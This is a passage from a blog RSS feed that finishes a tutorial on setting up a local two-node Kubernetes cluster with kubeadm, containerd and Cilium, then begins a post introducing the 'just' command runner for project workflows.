<span data-line=""><span style="color: #F69D50">cilium/cilium</span><span style="color: #ADBAC7">  	</span><span style="color: #6CB6FF">1.11</span><span style="color: #96D0FF">.7</span><span style="color: #ADBAC7">       	</span><span style="color: #6CB6FF">1.11</span><span style="color: #96D0FF">.7</span><span style="color: #ADBAC7">     	</span><span style="color: #96D0FF">eBPF-based</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Networking,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Security,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">and</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Observability</span></span>
<span data-line=""><span style="color: #F69D50">cilium/cilium</span><span style="color: #ADBAC7">  	</span><span style="color: #6CB6FF">1.11</span><span style="color: #96D0FF">.6</span><span style="color: #ADBAC7">       	</span><span style="color: #6CB6FF">1.11</span><span style="color: #96D0FF">.6</span><span style="color: #ADBAC7">     	</span><span style="color: #96D0FF">eBPF-based</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Networking,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Security,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">and</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Observability</span></span>
<span data-line=""><span style="color: #F69D50">cilium/cilium</span><span style="color: #ADBAC7">  	</span><span style="color: #6CB6FF">1.11</span><span style="color: #96D0FF">.5</span><span style="color: #ADBAC7">       	</span><span style="color: #6CB6FF">1.11</span><span style="color: #96D0FF">.5</span><span style="color: #ADBAC7">     	</span><span style="color: #96D0FF">eBPF-based</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Networking,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Security,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">and</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Observability</span></span>
<span data-line=""><span style="color: #F69D50">cilium/cilium</span><span style="color: #ADBAC7">  	</span><span style="color: #6CB6FF">1.11</span><span style="color: #96D0FF">.4</span><span style="color: #ADBAC7">       	</span><span style="color: #6CB6FF">1.11</span><span style="color: #96D0FF">.4</span><span style="color: #ADBAC7">     	</span><span style="color: #96D0FF">eBPF-based</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Networking,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Security,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">and</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Observability</span></span></code></pre></div>
<p>So we want <code>1.11.4</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">helm</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">install</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cilium</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cilium/cilium</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--namespace</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kube-system</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--version</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">1.11</span><span style="color: #96D0FF">.4</span></span></code></pre></div>
<p>Now our node should be ready!</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">node</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">           </span><span style="color: #96D0FF">STATUS</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">ROLES</span><span style="color: #ADBAC7">                  </span><span style="color: #96D0FF">AGE</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">VERSION</span></span>
<span data-line=""><span style="color: #F69D50">controlplane</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">Ready</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">control-plane,master</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">24</span><span style="color: #96D0FF">m</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">v1.23.5</span></span></code></pre></div>
<p>Time to join our worker to the cluster!</p>
<h2>Joining a worker to the cluster!</h2>
<p>We have to go through the same steps as the controlplane to get the point that we have a
container runtime and <code>kubeadm</code>.   I’m not going to talk about the commands a second time but
I’ll re-iterate them here for ease of following along.</p>
<p>First open up another shell and connect to the worker:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">multipass</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">shell</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">worker</span></span></code></pre></div>
<p>Now run the following commands:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">echo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"deb  http://apt.kubernetes.io/  kubernetes-xenial  main"</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">tee</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/etc/apt/sources.list.d/kubernetes.list</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">curl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-fsSL</span><span style="color: #ADBAC7">  </span><span style="color: #96D0FF">https://packages.cloud.google.com/apt/doc/apt-key.gpg</span><span style="color: #F47067">|</span><span style="color: #F69D50">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">gpg</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--dearmor</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/etc/apt/trusted.gpg.d/k8s.gpg</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">curl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-fsSL</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">https://download.docker.com/linux/ubuntu/gpg</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">gpg</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--dearmor</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/etc/apt/trusted.gpg.d/docker.gpg</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">echo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"deb https://download.docker.com/linux/ubuntu $(</span><span style="color: #F69D50">lsb_release</span><span style="color: #96D0FF"> </span><span style="color: #6CB6FF">-cs</span><span style="color: #96D0FF">) stable"</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">tee</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/etc/apt/sources.list.d/docker.list</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cat</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">&#x3C;&#x3C;</span><span style="color: #ADBAC7">EOF</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> sudo tee /etc/modules-load.d/k8s.conf</span></span>
<span data-line=""><span style="color: #96D0FF">overlay</span></span>
<span data-line=""><span style="color: #96D0FF">br_netfilter</span></span>
<span data-line=""><span style="color: #ADBAC7">EOF</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sed</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-i</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-e</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'/net.ipv4.conf.*.rp_filter/d'</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">$(</span><span style="color: #F69D50">grep</span><span style="color: #96D0FF"> </span><span style="color: #6CB6FF">-ril</span><span style="color: #96D0FF"> '\.rp_filter' /etc/sysctl.d/ /usr/lib/sysctl.d/)</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sysctl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-a</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">grep</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'\.rp_filter'</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">awk</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'{print $1" = 0"}'</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">tee</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-a</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/etc/sysctl.d/1000-cilium.conf</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cat</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">&#x3C;&#x3C;</span><span style="color: #ADBAC7">EOF</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> sudo tee /etc/sysctl.d/k8s.conf</span></span>
<span data-line=""><span style="color: #96D0FF">net.bridge.bridge-nf-call-ip6tables = 1</span></span>
<span data-line=""><span style="color: #96D0FF">net.bridge.bridge-nf-call-iptables  = 1</span></span>
<span data-line=""><span style="color: #96D0FF">net.ipv4.ip_forward                 = 1</span></span>
<span data-line=""><span style="color: #ADBAC7">EOF</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">systemctl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">restart</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">systemd-modules-load</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sysctl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--system</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">update</span><span style="color: #ADBAC7"> &#x26;&#x26; </span><span style="color: #F69D50">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">upgrade</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-y</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">install</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">containerd.io=</span><span style="color: #6CB6FF">1.6</span><span style="color: #96D0FF">.8-1</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-y</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cat</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">&#x3C;&#x3C;</span><span style="color: #ADBAC7">EOF</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> sudo tee /etc/containerd/config.toml</span></span>
<span data-line=""><span style="color: #96D0FF">version = 2</span></span>
<span data-line=""><span style="color: #96D0FF">[plugins]</span></span>
<span data-line=""><span style="color: #96D0FF">  [plugins."io.containerd.grpc.v1.cri"]</span></span>
<span data-line=""><span style="color: #96D0FF">   [plugins."io.containerd.grpc.v1.cri".containerd]</span></span>
<span data-line=""><span style="color: #96D0FF">      [plugins."io.containerd.grpc.v1.cri".containerd.runtimes]</span></span>
<span data-line=""><span style="color: #96D0FF">        [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc]</span></span>
<span data-line=""><span style="color: #96D0FF">          runtime_type = "io.containerd.runc.v2"</span></span>
<span data-line=""><span style="color: #96D0FF">          [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc.options]</span></span>
<span data-line=""><span style="color: #96D0FF">            SystemdCgroup = true</span></span>
<span data-line=""><span style="color: #ADBAC7">EOF</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">systemctl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">restart</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">containerd.service</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">install</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubeadm=</span><span style="color: #6CB6FF">1.23</span><span style="color: #96D0FF">.5-00</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubelet=</span><span style="color: #6CB6FF">1.23</span><span style="color: #96D0FF">.5-00</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl=</span><span style="color: #6CB6FF">1.23</span><span style="color: #96D0FF">.5-00</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-y</span></span>
<span data-line=""> </span></code></pre></div>
<p>From there we should be ready to join the cluster.   When we ran <code>kubeadm init</code> previously it
printed a join command out that we could use but I’m going to show you how to do it if you
were coming back later and no longer had that token.</p>
<p>Back on the <em>controplane</em> node run:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubeadm</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">token</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">create</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--print-join-command</span></span>
<span data-line=""><span style="color: #F69D50">kubeadm</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">join</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">192.168</span><span style="color: #96D0FF">.64.7:6443</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--token</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">wxs197.cco6mjj9ricvu8ov</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--discovery-token-ca-cert-hash</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sha256:bd01c065240fa76f30a02ecb70a8cea6e329c9678994d4da1f6ccac7694b97fb</span></span></code></pre></div>
<p>Now copy that command and run it with <code>sudo</code> on the worker:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubeadm</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">join</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">192.168</span><span style="color: #96D0FF">.64.7:6443</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--token</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">wxs197.cco6mjj9ricvu8ov</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--discovery-token-ca-cert-hash</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sha256:bd01c065240fa76f30a02ecb70a8cea6e329c9678994d4da1f6ccac7694b97fb</span></span></code></pre></div>
<p>After this completes it’ll take a minute or two for everything to be synced up but if you go
back to the master node you should have 2 ready nodes now:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">nodes</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">           </span><span style="color: #96D0FF">STATUS</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">ROLES</span><span style="color: #ADBAC7">                  </span><span style="color: #96D0FF">AGE</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">VERSION</span></span>
<span data-line=""><span style="color: #F69D50">controlplane</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">Ready</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">control-plane,master</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">46</span><span style="color: #96D0FF">m</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">v1.23.5</span></span>
<span data-line=""><span style="color: #F69D50">worker</span><span style="color: #ADBAC7">         </span><span style="color: #96D0FF">Ready</span><span style="color: #ADBAC7">    </span><span style="color: #F47067">&#x3C;</span><span style="color: #96D0FF">non</span><span style="color: #ADBAC7">e</span><span style="color: #F47067">></span><span style="color: #ADBAC7">                 </span><span style="color: #6CB6FF">79</span><span style="color: #96D0FF">s</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">v1.23.5</span></span></code></pre></div>
<h2>Accessing the cluster outside of the VMs!</h2>
<p>Now the final part is to get the <code>admin.conf</code> as a kubeconfig on your machine so you can control
it from outside of the cluster.   To do this we can use scp</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">multipass</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">transfer</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">controlplane:/home/ubuntu/.kube/config</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">local.config</span></span></code></pre></div>
<p>Normally kubernetes configuration is in ~/.kube/config but I like to maint a separate file for
each cluster and then I set the <code>KUBECONFIG</code> env var to access it.</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">KUBECONFIG=local.config</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">nodes</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">           </span><span style="color: #96D0FF">STATUS</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">ROLES</span><span style="color: #ADBAC7">                  </span><span style="color: #96D0FF">AGE</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">VERSION</span></span>
<span data-line=""><span style="color: #F69D50">controlplane</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">Ready</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">control-plane,master</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">56</span><span style="color: #96D0FF">m</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">v1.23.5</span></span>
<span data-line=""><span style="color: #F69D50">worker</span><span style="color: #ADBAC7">         </span><span style="color: #96D0FF">Ready</span><span style="color: #ADBAC7">    </span><span style="color: #F47067">&#x3C;</span><span style="color: #96D0FF">non</span><span style="color: #ADBAC7">e</span><span style="color: #F47067">></span><span style="color: #ADBAC7">                 </span><span style="color: #6CB6FF">11</span><span style="color: #96D0FF">m</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">v1.23.5</span></span></code></pre></div>]]></description>
            <link>https://sontek.net/blog/2022/local_kubeadm_cluster</link>
            <guid isPermaLink="true">https://sontek.net/blog/2022/local_kubeadm_cluster</guid>
            <pubDate>Sun, 17 Apr 2022 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[Automate project workflows with the command runner Just!]]></title>
            <description><![CDATA[<p>I believe every project should have a CLI built around the standard workflows of developing
on the project.  Things like:</p>
<ul>
<li>Install dependencies</li>
<li>Run tests</li>
<li>Run linter and formatters</li>
<li>Build project</li>
<li>Start / Stop the docker environment</li>
</ul>
<p>The reason I think this is important is because it makes a nice consistent and discoverable
entrypoint for understanding how you should work in the project.   If you only provide the
instructions in the <code>README</code> then you have to remember to update those docs every time you
add a new command.  Those docs aren't easily testable either.</p>
<p>Most of my career the command runner of choice for my projects as been <code>GNU Make</code> but it was
definitely the wrong tool for the job.  It is a build tool that I bent into shape to work
as a command runner for me.   These days I use the tool <a href="https://github.com/casey/just">just</a>.</p>
<h2>Intro to just</h2>
<p><a href="https://github.com/casey/just">Just</a> is a modern command runner with a similar syntax to <code>make</code>
that provides a nice way for building out your project CLI!  You create a file named <code>justfile</code>
at the root of your project and then the basic syntax is:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="make" data-theme="default"><code data-language="make" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #DCBDFB">help</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  @just --list</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #768390"># My first command</span></span>
<span data-line=""><span style="color: #DCBDFB">first</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  echo "Any commands you want to run go here!"</span></span></code></pre></div>
<p>The first <code>help</code> line defines a command "help" for your CLI and it lists out all the other available
commans.  I always put this line first because <code>just</code> runs the first command in the file if a specific
command isn't requested.  The output of this file looks like this:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">just</span></span>
<span data-line=""><span style="color: #F69D50">Available</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">recipes:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">first</span><span style="color: #ADBAC7"> </span><span style="color: #768390"># My first command</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">help</span></span></code></pre></div>
<p>Having help automatically generated is fantastic!  Its also really helpful that it adds the comment
to the command so that each command is self-documenting.  If you run the <code>first</code> command you'll notice
it also has a feature where it prints out the commands being ran so the user knows exactly what is
happening:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">just</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">first</span></span>
<span data-line=""><span style="color: #6CB6FF">echo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"Any commands you want to run go here!"</span></span>
<span data-line=""><span style="color: #F69D50">Any</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">commands</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">you</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">want</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">to</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">run</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">go</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">here!</span></span></code></pre></div>
<p>This doesn't always make sense though, so you can quickly remove that behavior by putting an <code>@</code> in front
of any of the commands, like I did for the <code>help</code> command above.  You can also declare dependencies if
you have re-usable parts of your workflow that many of your commands need.</p>
<p>For example, you might want to check versions of things like <code>node</code> and <code>python</code> before running the install
of their dependencies. So you could do something like:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="make" data-theme="default"><code data-language="make" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #DCBDFB">help</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  @just --list</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #ADBAC7">node_version := "v17.6.0"</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #768390"># Verify system dependencies</span></span>
<span data-line=""><span style="color: #DCBDFB">check-dependencies</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  @if [ ! "</span><span style="color: #96D0FF">$(</span><span style="color: #ADBAC7">node --version</span><span style="color: #96D0FF">)</span><span style="color: #ADBAC7">" = {{ node_version }} ]; \</span></span>
<span data-line=""><span style="color: #ADBAC7">  then \</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #DCBDFB">echo</span><span style="color: #ADBAC7"> </span><span style="color: #DCBDFB">"Missing</span><span style="color: #ADBAC7"> </span><span style="color: #DCBDFB">node</span><span style="color: #ADBAC7"> </span><span style="color: #DCBDFB">version</span><span style="color: #ADBAC7">: {{ node_version }}"; </span><span style="color: #F47067">\</span></span>
<span data-line=""><span style="color: #ADBAC7">    exit 1; </span><span style="color: #F47067">\</span></span>
<span data-line=""><span style="color: #ADBAC7">  fi</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #768390"># Install frontend</span></span>
<span data-line=""><span style="color: #DCBDFB">install</span><span style="color: #ADBAC7">: check-dependencies</span></span>
<span data-line=""><span style="color: #ADBAC7">  @echo "yarn install"</span></span></code></pre></div>
<p>which ends up with a CLI that looks like this:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">just</span></span>
<span data-line=""><span style="color: #F69D50">Available</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">recipes:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">check-dependencies</span><span style="color: #ADBAC7"> </span><span style="color: #768390"># Verify system dependencies</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">help</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">install</span><span style="color: #ADBAC7">            </span><span style="color: #768390"># Install frontend</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">just</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">install</span></span>
<span data-line=""><span style="color: #F69D50">Missing</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">node</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">version:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">v17.6.0</span></span>
